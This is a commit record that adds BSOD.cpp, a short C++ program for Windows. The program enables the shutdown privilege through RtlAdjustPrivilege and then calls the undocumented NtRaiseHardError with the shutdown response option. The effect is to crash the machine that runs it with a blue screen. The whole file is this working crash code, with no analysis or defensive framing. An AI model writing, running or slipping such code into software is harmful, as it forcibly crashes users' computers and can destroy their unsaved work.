b8c0cdef5e86cb95fa8e2d83bdbb6fe82f587acf
squidexf <dima.tzelinko228@gmail.com>
2025-04-29 22:41:14 +0300

    Add files via upload

---
+++ BSOD.cpp
@@ -0,0 +1,27 @@
+﻿
+#include <iostream>
+#include <Windows.h>
+#pragma comment(lib,"ntdll.lib")
+
+using namespace std;
+
+EXTERN_C NTSTATUS NTAPI RtlAdjustPrivilege(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
+
+EXTERN_C NTSTATUS NTAPI NtRaiseHardError(NTSTATUS ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask,
+	PULONG_PTR Parameters, ULONG ValidRespnseOption, PULONG Responce);
+
+int main() {
+
+	BOOLEAN b;
+
+	unsigned long responce;
+	
+	RtlAdjustPrivilege(19, true, false, &b);
+
+	NtRaiseHardError(STATUS_ASSERTION_FAILURE, 0, 0, 0, 6, &responce);
+
+
+		
+	return 0;
+
+}
